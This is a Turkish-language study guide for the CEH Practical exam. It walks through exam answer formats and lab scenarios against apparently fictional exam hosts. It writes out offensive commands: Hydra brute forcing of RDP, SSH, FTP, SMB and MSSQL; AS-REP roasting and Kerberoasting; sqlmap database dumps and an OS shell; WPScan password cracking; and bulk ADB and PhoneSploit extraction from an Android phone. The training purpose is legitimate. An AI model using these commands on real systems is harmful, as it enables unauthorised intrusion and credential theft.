# CEH v13 / v12 Practical & Engage Eksiksiz Sınav Ansiklopedisi
## Tüm Senaryolar, Komut Setleri, Hata Çözümleri ve Püf Noktaları

---

## 1. SINAV MEKANİĞİ & ÖLÜMCÜL FORMAT REGE-X TUZAKLARI

CEH Practical sınavı otomatik bir kod değerlendirme altyapısına sahiptir. Teknik olarak soruyu doğru çözseniz bile, cevabı sisteme girerken yapılan en ufak bir biçimlendirme hatası doğrudan **0 puan** almanıza neden olur.

### Kritik Kurallar ve Regex Eşleştirme Tablosu
* **Gereksiz Boşluk Bırakmayın:** Komut çıktısını kopyalarken başında veya sonunda boşluk kalmadığından emin olun.
* **Büyük/Küçük Harf Hassasiyeti:** Sistem harf büyüklüklerine %100 bakar.
* **Format Kalıpları:** Sorunun altında belirtilen formata harfiyen uyun.

| Beklenen Format Örneği | Girilmesi Gereken Doğru Yapı | Açıklama |
| :--- | :--- | :--- |
| `aaaaANNaN` | `pawnED1@2` | Küçük harf (a), Büyük harf (A), Rakam (N), Özel karakter (a) |
| `N` veya `NN` | `85` | Sadece ham rakam girilmelidir (Örn: Nem yüzdesi veya paket sayısı) |
| `AAAAA.AAA.aaa` | `SKILL.CEH.com` | Nokta işaretlerine ve harf büyüklüklerine tam uyum |
| `+N (NNN) NNN-NNNN` | `+1 (555) 234-5678` | Android arama geçmişi ve telefon formatı |
| `Warning / Error` | `Warning` | Wireshark ciddiyet seviyesi formatı (İlk harf büyük) |

---

## 2. AĞ TARAMASI, CANLI HOST & İŞLETİM SİSTEMİ TESPİTİ (ENGAGE PART 1)

### Subnet Canlı Host Sayısı Hesaplama (Ölümcül Gateway Tuzağı)
Sınavda bir alt ağdaki (subnet) canlı cihaz sayısı sorulduğunda, aksi belirtilmedikçe **Ağ Geçidi (Gateway) IP adresini düşmeniz gerekir.** Gateway genellikle ağın ilk IP'sidir (`.1`) veya son IP'sidir (`.254`).
```bash
# Alt ağda ping sweep (hızlı canlı host tespiti) yapma:
nmap -sn 192.168.10.0/24

# Püf Noktası: Nmap çıktısında toplam 6 adet "Host is up" görüyorsanız ve bunlardan biri .1 (Gateway) ise, sisteme girilecek doğru yanıt "5" olmalıdır.
```

### TTL Değeri ile Elle İşletim Sistemi (OS) Tespiti
Nmap taraması yapmadan, sadece tek bir ping paketi göndererek hedef sistemin işletim sistemini saniyeler içinde bulabilirsiniz:
```bash
ping -c 1 192.168.10.111
```
* **Çıktıda TTL <= 64 ise:** Hedef sistem **LINUX** (Örn: Ubuntu, Parrot, Android).
* **Çıktıda TTL >= 128 ise:** Hedef sistem **WINDOWS** (Örn: Windows 10, Server 2019).

### Kritik Servis Nokta Atışı Port Taramaları (Hızlı Keşif)
Sınavda tüm alt ağı tarayıp vakit kaybetmek yerine, sadece zafiyet barındıran aktif servisleri listelemek için `--open` parametresini kullanın:
```bash
# Linux ve SSH portu açık makineleri listeleme:
nmap -p 22 192.168.10.0/24 --open

# Domain Controller (Active Directory) tespiti (Port 53 ve 88 açık olmalıdır):
nmap -p 53,88 192.168.0.0/24 --open

# Veritabanı servisleri tespiti (MSSQL: 1433, MySQL: 3306, Oracle: 1521):
nmap -p 1433,3306 192.168.10.0/24 --open

# Donanımlı Versiyon ve NSE Script Taraması (Hedef IP kesinleşince):
nmap -sV -sC -O -p- -T4 192.168.10.111
```

---

## 3. ADVANCED ACTIVE DIRECTORY & VERİTABANI İSTİSMARI (ENGAGE PART 2)

### AS-REP Roasting (Ön Kimlik Doğrulama Gerektirmeyen Hesaplar)
Kerberos ön kimlik doğrulaması (`Do not require Kerberos preauthentication`) kapatılmış kullanıcıların biletlerini (TGT hash) şifresiz olarak çekme senaryosu:
```bash
# Kullanıcı listesini besleyerek TGT hashlerini çekme:
python3 GetNPUsers.py SKILL.CEH.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222

# Elde edilen $krb5asrep$ hashini John the Ripper ile kırma:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Alternatif olarak Hashcat ile kırma (Mod: 18200):
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting (Servis Hesaplarından Hash Çekme)
Eğer elinizde geçerli bir kullanıcı adı ve şifre varsa, ağdaki servis hesaplarına ait SPN (Service Principal Name) biletlerini çekebilirsiniz:
```bash
python3 getUserSPNs.py SKILL.CEH.com/bob:Password123 -dc-ip 192.168.0.222 -request
```

### LDAP Sayım Tuzağı (Kullanıcı Sayısı Tespiti)
`ldapsearch` aracı ile Active Directory üzerindeki tüm objeleri çekerken bilgisayar hesapları ve gruplar kafanızı karıştırabilir:
```bash
ldapsearch -x -H ldap://192.168.0.222 -b "dc=SKILL,dc=CEH,dc=com" "(objectClass=user)" sAMAccountName sAMAccountType
```
* **Kritik İpucu:** Soru sizden kaç tane gerçek "User Account" olduğunu istiyorsa, çıktının sonu `$` ile biten (Örn: `DESKTOP-ABC$`) **Computer** hesaplarını ve grup hesaplarını tek tek eleyin. Sadece gerçek insan kullanıcı adlarını sayın.

### MSSQL İstismarı & Saf Byte Cinsinden Dosya Boyutu Çekme
Sınavda Hydra ile kırılan bir MSSQL (`sa` kullanıcısı) hesabı üzerinden hedef Windows sunucusunda dosya analizi yapmanız istenebilir:
```bash
# Hydra ile MSSQL kaba kuvvet saldırısı:
hydra -L ~/users.txt -P /usr/share/wordlists/rockyou.txt 192.168.10.144 mssql

# Impacket mssqlclient ile Windows kimlik doğrulaması kullanarak bağlanma:
python3 mssqlclient.py sa:Sifre123@192.168.10.144 -windows-auth

# Hedef dosyaya gidip saf byte boyutunu öğrenme:
dir "C:\Users\Public\Downloads\MSS.txt"
```
* **Not:** Çıktıda dosya isminin sol tarafında yazan tam rakamı (Örn: `1,245 bytes` ise `1245` olarak) virgül olmadan sisteme girin.

---

## 4. GELİŞMİŞ WIRESHARK TRAFİK & AĞ ANALİZİ (SNIFFING)

Sınavda karşınıza çıkacak büyük pcapng analizlerinde vakit kaybetmemek için doğrudan filtre çubuğunu kullanın.

### DDoS ve DoS Saldırgan IP Tespiti (En Çok / En Az Paket Atan IP)
Ağda yoğun trafik oluşturan veya bağlantıyı kesmeye çalışan ana zararlıyı bulma adımları:
1. Üst filtre çubuğuna hedef makinenin IP'sini yazın: `ip.dst == 172.22.10.10`
2. Üst menüden **Statistics > Conversations** yolunu izleyin.
3. **IPv4** sekmesine tıklayın.
4. **Packets** (Paketler) sütununa tıklayarak büyükten küçüğe veya küçükten büyüğe sıralama yapın. En çok paket gönderen IP saldırgandır.

### IoT MQTT Protokol Analizi (Nem Yüzdesi & Topic Length)
Akıllı cihazların ürettiği şifresiz ağ trafiklerini yakalama:
* **Filtre:** `mqtt` veya `mqtt.msgtype == 3` veya `mqtt contains "High_humidity"`
* **Nem Yüzdesi Okuma:** Filtreleme sonrası ilgili pakete tıklayın. **Line-based text data** veya **MQ Telemetry Transport** dalını genişleterek `85` veya `90` gibi ham rakam uyarısını bulun.
* **Topic Length Değeri:** Paket detaylarında yer alan *Topic Length* değerini doğrudan ham sayı olarak okuyun.

### HTTP POST Kimlik Avı (Düz Metin Parola Avcılığı)
Saldırganların veya kurbanların web sitelerine gönderdiği şifrelenmemiş giriş bilgileri:
* **Filtre:** `http.request.method == "POST"`
* **Analiz:** Gelen paketlerin üzerine tıklayıp alt kısımdaki **Packet Details** penceresinden **HTML Form URL Encoded** sekmesini genişletin. `username` ve `password` parametrelerini (Örn: `adm / moviescope123`) düz metin olarak okuyun.

### Session Hijacking & DoS Reset Analizi
* **Filtre:** `tcp.flags.reset == 1` veya `arp.duplicate-address-frame`
* **Kullanım Amacı:** Ağda bağlantıyı koparmak amacıyla gönderilen sahte RST paketlerinin kaynağını ve kurban IP adresini tespit eder.

### Tüm Katmanlarda Gizli Flag / Anahtar Arama
Paketlerin ham verilerinin içine gömülmüş olan bayrakları yakalama:
1. `Ctrl + F` tuşlarına basın.
2. Arama kriterlerini üstten **Packet Bytes**, yanından **String** ve arama modunu **Case Sensitive** olarak ayarlayın.
3. Arama kutusuna `"flag"`, `"password"`, `"secret"` veya `"CTF"` yazarak paket içeriklerini taratın.

### Web Nesnelerini Masaüstüne Çıkarma (Malware Extract)
Trafikten geçen zararlı yazılımları veya gizli metin dosyalarını bilgisayarınıza kaydetme:
* **Menü Yolu:** `File > Export Objects > HTTP...` (Veya SMB, FTP-DATA). Açılan listeden şüpheli `.exe`, `.txt` veya `.php` dosyasını seçip **Save** diyerek yerel Kali masaüstünüze çıkarın.

---

## 5. ANDROID ADB, PHONESPLOIT & APK GÜVENLİĞİ (ENGAGE PART 4)

### ADB Sunucusunu Sıfırlama ve Bağlantı İstikrarı
Sınav esnasında mobil emülatör bağlantısı koptuğunda veya askıda kaldığında sunucuyu tamamen kapatıp yeniden ayağa kaldırın:
```bash
adb kill-server && adb start-server
adb connect 192.168.10.121:5555
adb devices
```

### ADB ile SDCard İçeriğini Tamamen Sızdırma (Pull)
Telefondaki tüm gizli dosyaları, flag metinlerini ve çerezleri tek hamlede Kali makinenize çekin:
```bash
adb pull /sdcard/ ~/AndroidData/
```
* **İpucu:** Çektiğiniz klasördeki `pawned.txt` veya benzeri şifreli bir dosya çıkarsa Windows makinesindeki **BCTextEncoder** aracıyla açıp deşifre edebilirsiniz.

### PhoneSploit ile APK Çıkarma ve CRC32 Bütünlük Kontrolü
Hedef telefonda kurulu olan şüpheli uygulamaların (APK) kaynak paketini analiz etme senaryosu:
1. `cd /opt/PhoneSploit` veya `cd ~/PhoneSploit` dizinine geçin ve aracı çalıştırın: `python3 phonesploit.py`
2. Menüden `[1]` seçeneğini seçip hedef Android IP adresini girin: `192.168.10.121`
3. Menüden `[36]` (veya `[17]` - Extract all APKs) seçeneğini seçerek yüklü paketi (Örn: `com.cxinventor...`) bilgisayarınıza indirin.
4. İndirilen APK dosyasının **CRC32** değerini hesaplayın:
```bash
# Eğer Kali'de crc32 aracı kuruluysa:
crc32 path_to_apk/base.apk

# Eğer yüklü değilse alternatif tam uyumlu araç:
jacksum -a crc32 path_to_apk/base.apk
```
* **Format Uyarısı:** Soru sizden sonu `"614c"` ile biten CRC32 değerini istiyorsa, ekranda çıkan 8 karakterli benzersiz hex değerini (Örn: `24a8614c`) eksiksiz olarak girin.

### ADB ve PhoneSploit ile Phishing / Arama Kaydı (Call Log) Dökümü
Telefonda kayıtlı olan kişileri ve yapılan oltalama aramalarını tespit etme:
* **PhoneSploit Menü [7]:** Dump Call Logs seçeneği ile arama geçmişini txt olarak dışarı aktarır. Şüpheli numarayı formatına uygun olarak alın (`+1 (555) 234-5678`).
* **Doğrudan Rehber Sorgusu:** `Maddy` veya benzeri bir kurbanın numarasını/ülke kodunu çekmek için:
```bash
adb shell content query --uri content://contacts/phones/ | grep -i "Maddy"
```

---

## 6. MALWARE, FORENSICS & STATİK/DİNAMİK ANALİZ (PROCMON, DIE, PE)

### Process Monitor (.PML) ile Saniyeler İçinde Parent PID Tespiti
Zararlı bir yazılımın (`H3ll0.exe`) hangi ana işlem (Parent Process) tarafından tetiklendiğini bulma adımları:
1. Windows Workstation üzerinde **Process Monitor (ProcMon)** aracını açın.
2. **File > Open** diyerek size verilen `Logfile.PML` dosyasını yükleyin.
3. `Ctrl + F` tuşlarına basarak soruda belirtilen zararlı işlem adını (`H3ll0.exe`) aratın.
4. Bulunan satıra **çift tıklayın** ve açılan pencereden **Process** sekmesine geçiş yapın.
5. **Parent PID** değerinin karşısında yazan rakamı (Örn: `6952`) not alın.

### Detect It Easy (DIE) ile ELF/PE Entropi Ölçümü
Dosyanın şifrelenmiş (encrypted) veya paketlenmiş (packed) olup olmadığını anlamak için kullanılan entropi analizi:
1. DIE (Detect It Easy) uygulamasını açın.
2. Şüpheli `Tornado.elf` veya `.exe` dosyasını sürükleyip aracın içine bırakın.
3. Sağ taraftaki **Entropy** butonuna tıklayın.
4. Sınav sizden virgülden sonra kaç basamak istiyorsa o şekilde okuyun (Örn: `2.87` veya `7.95`).

### readelf ile Program Headers ve Segment Boyutu Okuma
Zararlı yazılımın Linux bellek haritasındaki boyutunu bulma:
```bash
readelf -l Strange_File-1
```
* **Analiz:** Çıktıda yer alan **Program Headers** tablosundaki `PT_LOAD` satırına odaklanın. Bu satırın hizasındaki **FileSiz** veya **MemSiz** sütununda yazan hex değerini (Örn: `000c54ec`) tam olarak kopyalayın.

---

## 7. KRİPTOGRAFİ, STEGANOGRAFİ & GİZLİ VERACRYPT KONTEYNERLARI

### VeraCrypt Gizli Konteyner Analizi ve İçerik Sayma
Şifreli sanal disklerin çözülmesi ve içerisindeki gizli delillerin toplanması:
1. Eğer şifre doğrudan verilmediyse, masaüstündeki veya Documents altındaki `Hash2crack.txt` dosyasını John ile kırarak parolayı öğrenin: `john --wordlist=/usr/share/wordlists/rockyou.txt Hash2crack.txt` (Örn parola: `veratest`, `pumpkin`).
2. **VeraCrypt GUI** uygulamasını açın.
3. Boşta duran herhangi bir harfli sürücüyü seçin (Örn: `Drive F:`).
4. **Select File** butonuna basarak şifreli konteyner dosyasını (`MyVeracrypt` veya `Its_File`) seçin.
5. **Mount** butonuna basın ve bulduğunuz parolayı girin.
6. Bilgisayarım altından mount edilen sanal sürücüye giriş yapın. İçerisindeki `.txt` veya flag dosyalarını tek tek sayın (Cevap genellikle `4` veya `5` gibi net bir sayıdır).

### SNOW ile Boşluk (Whitespace) Steganografisi
Görünürde hiçbir metin barındırmayan boşluk karakterlerinin arkasına gizlenmiş verileri çıkarma:
```bash
snow -C -p "soruda_verilen_parola" restricted.txt
```

### Steghide ile Resim Dosyalarından Veri Çıkarma
```bash
steghide extract -sf suspicious.jpg -p "soruda_verilen_parola"
```

### CrypTool ile 128-bit Modern Simetrik Şifre Çözme
1. Windows makinede **CrypTool** uygulamasını açın.
2. Size verilen `.hex` veya şifreli dosyayı içeri sürükleyin.
3. Üst menüden **Encrypt/Decrypt > Symmetric (Modern) > Further Algorithms > Twofish** (Veya AES/RC4) seçeneğini seçin.
4. **Key Length** alanını `128 bit` yapın.
5. Key giriş alanına sorunun belirttiği deseni girin (Örn: "16 kez 06 girin" denildiyse byte modunda `06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06` yazın).
6. **Decrypt** butonuna basarak deşifre edilmiş gizli metni ve algoritma doğrulamasını ekrandan okuyun.

---

## 8. KABA KUVVET (HYDRA) & WEB ZAFIYETLERİ (SQLMAP, WPSCAN)

### Hydra Çoklu Protokol Komut Söz Dizimi (Syntax)
Sınavda arka planda sözlük saldırısı başlatıp diğer sorulara geçmek zamandan tasarruf sağlar:
```bash
# RDP Kaba Kuvvet:
hydra -l Jones -P /usr/share/wordlists/rockyou.txt rdp://10.10.55.X

# SSH Kaba Kuvvet:
hydra -l marcus -P /usr/share/wordlists/rockyou.txt ssh://10.10.55.X

# FTP Kaba Kuvvet:
hydra -l nick -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.111

# SMB Kaba Kuvvet:
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.55.X
```

### SQLMap ile Oturum (Cookie) Korumalı Sayfalarda Veri Sızdırma
Sınavda doğrudan SQLMap çalıştırdığınızda giriş sayfasına yönleniyorsa ve hata alıyorsanız, tarayıcı çerezinizi eklemeniz şarttır:
1. Hedef siteye tarayıcıdan giriş yapın.
2. `F12 > Console` sekmesini açıp `document.cookie` komutunu yazın ve `PHPSESSID=d9a8f7c6...` değerini kopyalayın.
3. SQLMap komutuna `--cookie` parametresiyle dahil edin:
```bash
# Veritabanlarını listeleme:
sqlmap -u "http://cinema.cehorg.com/profile.php?id=1" --cookie="PHPSESSID=d9a8f7c6" --batch --dbs

# Belirli bir tablonun içeriğini dump etme:
sqlmap -u "http://cinema.cehorg.com/profile.php?id=1" --cookie="PHPSESSID=d9a8f7c6" -D cinema_db -T users -C username,password --dump --batch

# Doğrudan sistem komut satırını alma (OS-Shell):
sqlmap -u "http://cinema.cehorg.com/profile.php?id=1" --cookie="PHPSESSID=d9a8f7c6" --os-shell
```

### WPScan ile WordPress İstihbaratı ve Kullanıcı Kırma
```bash
# Kullanıcı adlarını otomatik çekme:
wpscan --url http://www.cehorg.com -e u

# Tespit edilen 'adam' kullanıcısının şifresini rockyou ile kırma:
wpscan --url http://www.cehorg.com -U adam -P /usr/share/wordlists/rockyou.txt
```

### Web Eksik Güvenlik İlkeleri (Clickjacking & CSP)
* **Clickjacking Tespiti:** Terminalde `curl -I http://www.goodshopping.com` komutunu çalıştırın. Eğer çıktıda `X-Frame-Options` veya `Content-Security-Policy: frame-ancestors` başlığı (header) yoksa, bu site Clickjacking saldırılarına karşı **ZAFİYETLİDİR** (Cevap: `Yes`).
* **XSS ve SQLi Engelleme:** Tarayıcı seviyesinde betik çalıştırmayı ve enjeksiyonları azaltan eksik ilke sorulduğunda cevap: **Content Security Policy** olacaktır.

---

## 9. EN SIK KARŞILAŞILAN SINAV HATALARI & ANINDA MÜDAHALE REÇETESİ

### Hata 1: `Load key "id_rsa": error in libcrypto`
* **Nedeni:** SSH gizli anahtar dosyasının adının `id_rsa` olmasına rağmen içerisindeki algoritmanın aslında `ED25519` olması veya base64 bloklarındaki satır uzunluklarının tam oturmaması.
* **Çözüm:** Dosya adını `id_ed25519` yapın, dosya içeriğinin standart OpenSSH blok formatında (her satır maksimum 70 karakter) olduğundan emin olun ve izinleri kısıtlayın:
```bash
chmod 600 id_ed25519
ssh -i id_ed25519 user@target_ip -p 2222
```

### Hata 2: Hydra Saldırısı Sırasında Hedef Servisin Çökmesi / Bağlantıyı Reddetmesi
* **Nedeni:** Hydra'nın çok agresif ve yüksek iş parçacığıyla (thread) saldırması neticesinde hedef makinenin portu kilitlemesi.
* **Çözüm:** İstek hızını düşürmek için `-t 1` veya `-t 4` parametresini ekleyin ve istekler arasına bekleme süresi koyun.

### Hata 3: SQLMap'in Bağlantı Hatası Vermesi veya Döngüye (Loop) Girmesi
* **Nedeni:** WAF (Web Application Firewall) engellemesi veya oturum süresinin dolması.
* **Çözüm:** `--batch` parametresinin yanına `--random-agent` ekleyerek tarayıcıyı gizleyin ve `--cookie` çerezinizi tarayıcıdan tazeleyip komutu yeniden çalıştırın.

---

## 10. SINAVDA KULLANIMI SERBEST MUHTEŞEM ONLİNE ARAÇLAR

Sınav ortamındaki iLabs bilgisayarlarının yerel tarayıcısından internetteki şu iki siteye erişim hakkınız vardır. Bu siteler yerel CPU'nuzu yormadan saniyeler içinde sonuca ulaşmanızı sağlar:

1. **[Hashes.com (Hash Kırıcı)](https://hashes.com/en/decrypt/hash):** Sınavda yakaladığınız tüm MD5, NTLM veya SHA256 hashlerini doğrudan bu siteye yapıştırın. Dünyanın en büyük veritabanına sahip olduğu için 1 saniyede şifresiz halini önünüze getirecektir.
2. **[CyberChef (Veri Dönüştürücü Sihirbazı)](https://gchq.github.io/CyberChef/):** Karmaşık base64 dönüşümleri, hex deşifre işlemleri veya steganografi çıktı analizleri için sağ paneldeki **"Magic"** fonksiyonunu kullanarak veriyi anında okunabilir düz metne çevirebilirsiniz.
